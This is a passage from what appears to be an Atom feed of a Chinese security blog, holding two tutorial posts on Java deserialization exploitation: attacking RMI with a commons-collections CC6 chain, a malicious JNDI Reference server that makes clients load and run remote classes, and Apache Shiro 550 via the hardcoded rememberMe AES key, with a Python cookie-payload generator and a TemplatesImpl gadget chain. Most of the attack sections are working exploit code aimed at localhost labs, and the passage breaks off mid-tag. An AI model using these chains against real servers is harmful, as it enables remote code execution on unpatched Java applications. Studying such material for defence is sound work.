    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化之RMI</title>
    <link href="http://example.com/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/"/>
    <id>http://example.com/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/</id>
    <published>2023-03-28T08:37:15.000Z</published>
    <updated>2023-08-07T01:19:19.347Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RMI">RMI</h1><p><code>RMI（Remote Method Invocation）</code>是Java中用于实现<code>远程方法调用</code>的机制,它允许在不同的JVM之间传递和执行Java对象的方法调用。</p><p>下面是一个简单的RMI示例代码：</p><p>Server端代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">NeedOb</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;<span class="comment">//创建远程对象接口,这里要继承Remote</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayhello</span> <span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NeedObject</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">NeedOb</span>&#123;<span class="comment">//接口实现类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">NeedObject</span><span class="params">()</span> <span class="keyword">throws</span>  RemoteException&#123;&#125;;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayhello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">NeedObject</span> <span class="variable">needObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NeedObject</span>();<span class="comment">//初始化远程对象（在这里其实就可以使用了,只不过不知道端口号）</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;needObject&quot;</span>,needObject);<span class="comment">//绑定needObject对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Client端代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">NeedOb</span> <span class="variable">needObject2</span> <span class="operator">=</span> (NeedOb) registry.lookup(<span class="string">&quot;needObject&quot;</span>);</span><br><span class="line">        System.out.println(needObject2.sayhello());<span class="comment">//调用sayhello方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果输出：</p><p><img src="image-20230328170900218.png" alt="image-20230328170900218"></p><p>通讯过程：</p><ol><li>客户端通过lookup()方法查找远程对象的引用。这个过程需要指定要查找的远程对象的URL地址（包括主机名、注册表名称和对象名称）。</li><li>客户端调用远程对象的方法。这个过程和调用本地对象的方法类似,客户端并不知道这个对象在运行时是否在本地,也不知道对象实现的细节。</li><li>客户端请求经过网络传输到服务端。这个过程涉及到数据的编码和解码,通过<code>Java序列化机制</code>将对象转换成字节数组进行传输。</li><li>服务端收到请求,根据请求参数调用相应的方法,并将结果返回给客户端。这个过程同样需要涉及数据的编码和解码。</li><li>服务端的响应经过网络传输到客户端,客户端接收响应并将返回值转换成本地对象。</li></ol><h1 id="序列化利用">序列化利用</h1><p>仅通过上述代码是很难进行利用的,但我们从传输的过程可以发现客户端在调用远程对象方法的时候,传输的参数有一个<code>先在客户端序列化,然后在服务端反序列化</code>的过程,所以我们就可以利用这个过程实现反序列化的利用,这里以CC6为例。</p><p>条件：远程调用方法允许传入<code>Object对象</code>&amp;服务端<code>有commons-collections的依赖</code></p><p>我们首先把sayhello方法修改成可传入Object对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NeedObject</span>  <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">NeedOb</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">NeedObject</span><span class="params">()</span> <span class="keyword">throws</span>  RemoteException&#123;&#125;;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayhello</span><span class="params">(Object object)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在服务端添加commons-collections依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>客户端修改poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="string">&quot;13&quot;</span>);</span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(tiedMapEntry,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">hashMap.remove(<span class="string">&quot;13&quot;</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> tiedMapEntry.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">mapfield</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">mapfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">mapfield.set(tiedMapEntry,lazymap);</span><br><span class="line"></span><br><span class="line"><span class="comment">//以上是cc6的利用链生成</span></span><br><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line"><span class="type">NeedOb</span> <span class="variable">needObject</span> <span class="operator">=</span> (NeedOb) registry.lookup(<span class="string">&quot;needObject&quot;</span>);</span><br><span class="line">needObject.sayhello(hashMap);<span class="comment">//传入反序列化对象</span></span><br></pre></td></tr></table></figure><p>命令执行成功！！！</p><p><img src="image-20230328194847154.png" alt="image-20230328194847154"></p><h1 id="RMI-JNDI">RMI+JNDI</h1><p>JNDI（Java 命名和目录接口）是 Java 平台提供的一组 API,用于查找和访问命名和目录服务。它可以让 Java  应用程序在运行时动态地查找和使用各种资源,如数据库连接、邮件服务器、JMS 消息队列等。通过 JNDI,Java  应用程序可以在不同的环境中进行配置和部署,而无需修改代码。</p><p><img src="image-20230329202416845.png" alt="image-20230329202416845"></p><p>JNDI支持很多协议,其中就包括RMI协议</p><p>以下是一段利用jndi调用远程对象的客户端实例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();<span class="comment">//创建JNDI上下文</span></span><br><span class="line"><span class="type">NeedOb</span> <span class="variable">needObject</span> <span class="operator">=</span> (NeedOb) context.lookup(<span class="string">&quot;rmi://localhost:1099/needObject&quot;</span>);</span><br><span class="line">context.lookup(<span class="string">&quot;rmi://localhost:1099/needObject&quot;</span>);</span><br><span class="line">System.out.println(needObject.sayhello(<span class="string">&quot;111&quot;</span>));</span><br></pre></td></tr></table></figure><p>运行后将会直接调用远程对象的sayhello方法</p><p>之前我们是利用客户端去攻击服务端,而RMI+JNDI可以利用服务端去攻击客户端,当客户端lookup里的参数可控时,我们构造以下服务端代码来执行任意命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Test&quot;</span>,<span class="string">&quot;Test&quot;</span>,<span class="string">&quot;http://127.0.0.1:7777/&quot;</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;needObject&quot;</span>,wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的Test类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先启动服务程序,然后在Test.class文件位置用<code>python -m http.server 7777</code>在本地7777端口开一个http服务</p><p>启动客户端发现命令被执行</p><p><img src="image-20230329205341513.png" alt="image-20230329205341513"></p><p>这段代码的重点在于<code>Reference reference  = new Reference(&quot;Test&quot;,&quot;Test&quot;,&quot;http://127.0.0.1:7777/&quot;);</code></p><p>在Java的JNDI（Java命名和目录接口）中,<code>Reference类</code>用于表示对远程或本地资源的引用,例如Web服务、JDBC数据源等。<code>Reference对象</code>通常包含了一些元数据信息,如引用类型、名称、位置、认证信息等。</p><p><code>Reference(String className, String factoryClassName, String location)</code>是Reference类的一个构造方法,传入的三个参数分别为<code>类名</code>、<code>工厂类名</code>、<code>URL地址</code></p><p>因为<code>Reference</code>没有实现<code>Remote</code>接口也没有继承<code>UnicastRemoteObject</code>类,故不能作为远程对象bind到注册中心,所以需要使用<code>ReferenceWrapper</code>对<code>Reference</code>的实例进行一个封装。</p><p>当客户端运行代码的时候会去http://127.0.0.1:7777寻找Test类同时调用其构造方法,于是就触发了构造方法中的命令</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;RMI&quot;&gt;RMI&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;RMI（Remote Method Invocation）&lt;/code&gt;是Java中用于实现&lt;code&gt;远程方法调用&lt;/code&gt;的机制,它允许在不同的JVM之间传递和执行Java对象的方法调用。&lt;/p&gt;
&lt;p&gt;下面是</summary>
      
    
    
    
    <category term="JAVA" scheme="http://example.com/categories/JAVA/"/>
    
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化之shiro550</title>
    <link href="http://example.com/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bshiro550/"/>
    <id>http://example.com/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bshiro550/</id>
    <published>2023-03-27T11:43:21.000Z</published>
    <updated>2023-06-14T11:56:36.282Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建">环境搭建</h1><p>下载shiro</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone http://github/apache/shiro.git</span><br><span class="line">cd shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure><p>用idea打开<code>shiro\samples\web</code>项目,将pom.xml中的jstl版本修改为<code>1.2</code>（大概70行的位置）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>tomcat部署</p><p><img src="image-20230327201105796.png" alt="image-20230327201105796"></p><p><img src="image-20230325213837905.png" alt="image-20230325213837905"></p><p>运行并打开网页</p><p><img src="image-20230325215750024.png" alt="image-20230325215750024"></p><h1 id="无CC依赖URLDNS反序列化验证">无CC依赖URLDNS反序列化验证</h1><p>登陆处勾选Remember Me</p><p><img src="image-20230325215850511.png" alt="image-20230325215850511"></p><p>点击登录、抓包,发现响应包里会出现<code>rememberMe</code>字段</p><p><img src="image-20230325220319641.png" alt="image-20230325220319641"></p><p>同时再次发送请求时会直接发送这个rememberMe</p><p><img src="image-20230325220451738.png" alt="image-20230325220451738"></p><p>查找和cookierememberme有关的且在shiro包里的类,发现<code>CookieRememberMeManager类</code><img src="image-20230325220908898.png" alt="image-20230325220908898"></p><p>CookieRememberMeManager的<code>getRememberedSerializedIdentity</code>接收了请求的rememberMe参数,同时对其进行base64解密</p><p><img src="image-20230325222817415.png" alt="image-20230325222817415"></p><p>找一下谁调用了getRememberedSerializedIdentity方法,发现是<code>AbstractRememberMeManager类</code>的<code>getRememberedPrincipals</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> PrincipalCollection <span class="title function_">getRememberedPrincipals</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext);<span class="comment">//这里调用了getRememberedSerializedIdentity</span></span><br><span class="line">        <span class="comment">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span></span><br><span class="line">        <span class="keyword">if</span> (bytes != <span class="literal">null</span> &amp;&amp; bytes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            principals = convertBytesToPrincipals(bytes, subjectContext);<span class="comment">//这里对传过来的参数做进一步的处理</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException re) &#123;</span><br><span class="line">        principals = onRememberedPrincipalFailure(re, subjectContext);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> principals;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看<code>convertBytesToPrincipals</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">convertBytesToPrincipals</span><span class="params">(<span class="type">byte</span>[] bytes, SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">        bytes = decrypt(bytes);<span class="comment">//解密</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deserialize(bytes);<span class="comment">//反序列化</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看一下解密的部分</p><p><img src="image-20230325224357492.png" alt="image-20230325224357492"></p><p>可以看到密钥是一个定值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure><p>并且从上方的内容可以推断出是aes加密</p><p><img src="image-20230325224546707.png" alt="image-20230325224546707"></p><p>deserialize方法一直追下去发现调用了<code>readObjet</code>方法</p><p><img src="image-20230325224740559.png" alt="image-20230325224740559"></p><p>最终大致的流程为shiro将得到的rememberMe参数进行了base64解密,然后再aes解密,最终反序列化</p><p>我们用之前的DNSURL来验证一下,将序列化的test.ser文件用python脚本来生成payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.ser&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">BS = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">mode = AES.MODE_CBC</span><br><span class="line">iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line"><span class="built_in">print</span>(ciphertext)</span><br></pre></td></tr></table></figure><p>将输出结果替换为rememberMe的参数值,同时将JSESSIONID删除（否则不会对rememberMe的值反序列化）</p><p><img src="image-20230325232039969.png" alt="image-20230325232039969"></p><p>发送以后,发现成功收到了DNS请求,证明反序列化成功</p><p><img src="image-20230325232113338.png" alt="image-20230325232113338"></p><h1 id="有CC依赖的命令执行">有CC依赖的命令执行</h1><p>为shiro项目添加commons-collections依赖,这里选择3.2.1版本</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里由于shiro在反序列化的过程中ClassResolvingObjectInputStream类对resolveClass方法进行了重写,如果反序列化流中包含非java自身的数组,就会出现无法加载类的错误,所以我们这里<code>不能使用ChainedTransformer类</code>。</p><p>这里主要利用的是<code>cc6+cc2+cc3</code>（实际测试在jdk版本为1.7会失败,使用1.8版本成功）</p><p>poc如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//cc3</span></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">namefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">namefield.set(templates,<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] codes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\php_project\\shengji_study\\target\\classes\\runtime.class&quot;</span>));</span><br><span class="line">bytecodesfield.set(templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;codes&#125;);</span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryfield.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//cc2</span></span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//cc6</span></span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,templates);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">lazymap.remove(templates);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">factoryfield</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">factoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">factoryfield.set(lazymap,invokerTransformer);</span><br><span class="line"></span><br><span class="line">Test.Serialize(hashMap);</span><br></pre></td></tr></table></figure><p><img 